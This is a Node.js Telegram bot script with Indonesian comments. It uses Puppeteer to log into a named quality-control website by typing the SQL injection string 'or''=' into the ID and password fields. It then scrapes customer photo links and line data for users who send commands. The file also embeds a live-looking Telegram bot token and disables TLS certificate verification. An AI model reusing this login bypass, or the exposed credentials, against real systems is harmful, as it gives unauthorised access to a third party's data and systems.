

const request = require('request');

const puppeteer = require("puppeteer");

const fetch = require("node-fetch");
/////Area coba coba

const http = require('http');


const https = require('https');

const httpsAgent = new https.Agent({
      rejectUnauthorized: false,
});

/////Area coba coba

function uniq(a) {
    var seen = {};
    return a.filter(function(item) {
        return seen.hasOwnProperty(item) ? false : (seen[item] = true);
    });
}
(async () => {
console.log("Starting server....");


    const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
function kirim_pesan(chat_id,text){
    
    request('https://api.telegram.org/bot6064787787:AAFrS21whMBWOvK0KTVEdte_DQkDxl_lDj0/sendMessage?parse_mode=HTML&chat_id='+ chat_id +'&text=' + encodeURIComponent(text), { json: true }, (err, res, body) => {
  if (err) { return console.log(err); }
 
});
}
    var last_msg = "0";
    console.log("Starting Puppeteer....");
    const browser = await puppeteer.launch({ headless: false, args: [ '--ignore-certificate-errors' ]});
    const page = await browser.newPage();
/////WEB LINK
console.log("Login QC borneo....");
    await page.goto("http://qcborneo.id/qc/?inet=");
    
/////LOGIN
   await page.waitForSelector("#nik");
    await page.type("#nik", "'or''='");
    await page.type("#pass", "'or''='");
    await page.click("button");
    
    console.log("Success Login....");


  
   

    console.log("Starting Bot Server....");


/////TEST
while(true){
   // console.log("Looping ke- \n");
    

   try{

    delay(2000);
    const responsenya = await fetch('https://api.telegram.org/bot6064787787:AAFrS21whMBWOvK0KTVEdte_DQkDxl_lDj0/getUpdates?offset='+last_msg);
    


    const response = await responsenya.json();

    //console.log(response);

      
        //    console.log(body);
        var result = response.result;
        var wasu = response.result.slice(-1)[0];
    
        

        
      
        for (let table of result) {
            
            var msg_id = table.update_id;
            
            if (msg_id === last_msg){
                   // console.log("Pesan tidak di tampilkan karena sudah di kirim sebelumnya " + last_msg);
            }

            else{

             

                console.log("MSG ID : " + msg_id + "\n");
              
                if (table.hasOwnProperty('message')) {
                    
                    if (table.message.hasOwnProperty('text')) {
                        console.log("Ini Pesan\n");

                        var text = table.message.text;

                        var chtid = table.message.chat.id;
                        
                        var status_user = await fetch("https://ilipi.xyz/redaman.ilipi.xyz/check.php?chat_id=" + chtid);
                        var status_user = await status_user.text();
                        //console.log(status_user);

                        if (text == "/status"){
                            kirim_pesan(chtid,"ID KAMU : " + chtid);
                        }


                        if (status_user === "true"){


                            
                if (text === "/start"){
                    kirim_pesan(chtid,"Masukkan Nomor Inet");
                }
                

                else if (text.startsWith("/systemcall_access")){
                    var user_id = text.replace("/systemcall_access ","");
                    var access = await fetch("https://ilipi.xyz/redaman.ilipi.xyz/access.php?chat_id=" + user_id);
                    var access = await access.text();
                    
                    
                    kirim_pesan(chtid,"Access Success");

                }
                else if (text === "/menu"){
                    kirim_pesan(chtid,"MENU: \n /foto 16xxxxxxx \n /status untuk cek ID");
                }
                else if (text.startsWith("/foto ")){
                    
                    var val_inet = text.replace("/foto ","");
                   
                    
                    await page.goto("http://qcborneo.id/qc/?inet=" + val_inet);
                    
                    const inner_html = await page.evaluate(() => document.querySelector('.p-5').innerHTML);
                    await page.waitForSelector(".p-5");
                 
                    if (inner_html.includes("https://")){
                        if (inner_html.includes(".jpg")){



                            var inner_html2 = inner_html.replace(/"/g, "");
                            var inner_html3 = inner_html2.replace(/>/g, "");
        
                            var innfix = inner_html3.match(/\bhttps?:\/\/\S+/gi);
                            
                            var matches = uniq(innfix);
        
                            var cokok = [];
                            
                           console.log(uniq(matches));
                            
                            for (let pler of matches) {
                               cokok.push("<a href='" + pler + "'>Tekan untuk melihat gambar..</a>"  );
                            }
                            
                            var text = cokok.join("\n");
                            kirim_pesan(chtid,text);
            
    
                        }
                        else{
                            kirim_pesan(chtid,"gambar tidak di temukan");
                        }

                    }
                    else{
                        kirim_pesan(chtid,"gambar tidak di temukan");
                    }
            
                }
                //pembatas
                else{
                   
                    
                    try {
                        var data_redaman = await fetch("https://ilipi.xyz/redaman.ilipi.xyz/?inet=" + text, {
                           
                        agent: httpsAgent,
                      });
                       
                      var data_redaman = await data_redaman.json();
                        

                        console.log(data_redaman);

                        //console.log(data_redaman);
                        kirim_pesan(chtid,`REDAMAN : ${data_redaman.redaman}\nSN : ${data_redaman.sn}\n BANDWIDTH : ${data_redaman.bandwidth} `);


                        

                      } catch (error) {
                        console.log(error);
                        kirim_pesan(chtid,"Server gangguan");
                      }

                
                }

    

                        }else{
                            
                            kirim_pesan(chtid,"Kamu tidak punya izin untuk menggunakan bot ini");
                        }

                
                    } else {
                        console.log("Ini Aksi lain\n");
                    }
    
                    
                } else {
                    console.log("Ini Aksi lain2\n");
                }

               


            }
            //batas elsenya

            // console.log(table)
             //console.log("\n\n\n");
          /*
    
    
    
    
    
            
    
        
    */
           
        
        }

        
       last_msg = wasu.update_id;




    }catch(error){
        console.log(error);
    }
    
}




})();